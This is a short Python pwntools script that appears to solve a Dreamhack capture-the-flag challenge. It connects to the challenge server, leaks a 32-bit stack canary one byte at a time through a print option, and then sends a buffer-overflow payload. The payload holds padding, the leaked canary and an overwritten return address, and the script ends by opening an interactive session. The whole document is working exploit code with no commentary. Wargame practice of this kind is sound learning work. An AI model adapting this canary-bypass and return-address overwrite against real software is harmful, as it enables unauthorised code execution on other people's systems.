from pwn import *

r = remote("host1.dreamhack.games", 14230)

canary = []

for i in range(4):
    r.sendline(b"P")
    r.sendline(str(0x80 + i).encode())

    r.recvuntil(b"is : ")
    canary.append(int(r.recvline(), 16))

canary = bytes(canary)

print(u32(canary))

payload = b"A" * 0x40 + canary + b"A" * 4 + b"B" * 4 + p32(0x80486b9)

r.sendline(b"E")
r.sendline(str(len(payload)).encode())
r.sendline(payload)

r.interactive()